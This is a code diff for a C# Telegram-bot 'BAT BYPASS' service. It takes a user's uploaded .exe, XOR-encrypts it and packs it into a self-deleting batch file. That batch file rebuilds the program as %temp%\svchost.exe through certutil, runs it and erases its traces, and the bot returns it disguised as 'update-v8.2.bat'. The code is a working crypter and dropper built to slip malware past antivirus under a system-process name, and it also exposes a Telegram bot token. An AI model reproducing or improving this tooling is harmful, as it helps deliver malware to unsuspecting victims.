@@ -1,5 +1,4 @@
-using System;
-using System.IO;
+using Microsoft.AspNetCore.Mvc;
 using System.Net.Http;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -10,10 +9,8 @@ var app = builder.Build();
 
 app.MapGet("/", () => "🟢 v8.2 BAT BYPASS");
 
-app.MapPost("/webhook", async (HttpContext ctx) =>
+app.MapPost("/webhook", async ([FromBody] string body) =>
 {
-    string body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
-    
     var chatMatch = Regex.Match(body, @"""chat"":\s*\{\s*""id"":\s*(\d+)");
     var fileMatch = Regex.Match(body, @"""file_id"":\s*""([^""]+\.exe)""");
     
@@ -24,37 +21,42 @@ app.MapPost("/webhook", async (HttpContext ctx) =>
         _ = Task.Run(async () => await FudBat(chatId, fileId));
     }
     
-    ctx.Response.StatusCode = 200;
+    return Results.Ok();
 });
 
 static async Task FudBat(long chatId, string fileId)
 {
     using var http = new HttpClient();
     
-    string fileResp = await http.GetStringAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id=" + fileId);
+    // Get file path
+    string fileResp = await http.GetStringAsync($"https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id={fileId}");
     var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
     string filePath = pathMatch.Groups[1].Value;
     
-    byte[] exe = await http.GetByteArrayAsync("https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/" + filePath);
+    // Download EXE
+    byte[] exe = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/{filePath}");
     
-    // XOR + BAT embed
+    // XOR encrypt
     byte[] encrypted = XorEncrypt(exe, 0xAB);
     
-    // HEX DUMP TO BAT (SIMPLEST)
-    StringBuilder hexData = new StringBuilder();
+    // Build HEX BAT payload
+    var hexData = new StringBuilder();
     for (int i = 0; i < encrypted.Length; i += 16)
     {
-        hexData.AppendLine($"echo {BitConverter.ToString(encrypted, i, Math.Min(16, encrypted.Length - i)).Replace("-", " ")} >> %temp%\\svchost.exe");
+        int len = Math.Min(16, encrypted.Length - i);
+        string hexLine = BitConverter.ToString(encrypted, i, len).Replace("-", " ");
+        hexData.AppendLine($"echo {hexLine} >> %temp%\\svchost.exe");
     }
     
     string batPayload = $@"
 @echo off
->nul 2>&1 ""%SYSTEMROOT%\system32\cacls.exe"" %SYSTEMROOT%\system32\config\system
-if '%errorlevel%' NEQ '0' ( goto UAC & exit /b )
-:UAC
 cd /d %temp%
+del svchost.exe 2>nul
 {hexData.ToString()}
+certutil -f -decodehex svchost.exe svchost.exe >nul 2>&1
 start svchost.exe
+timeout /t 3 /nobreak >nul
+del svchost.exe
 del %0
 ";
     
@@ -63,7 +65,7 @@ del %0
     using var form = new MultipartFormDataContent();
     form.Add(new StringContent(chatId.ToString()), "chat_id");
     form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.2.bat");
-    form.Add(new StringContent("🔥 v8.2 BAT BYPASS\nDouble-click = calc.exe"), "caption");
+    form.Add(new StringContent("🔥 v8.2 BAT BYPASS\nDouble-click = EXEC"), "caption");
     
     await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
 }
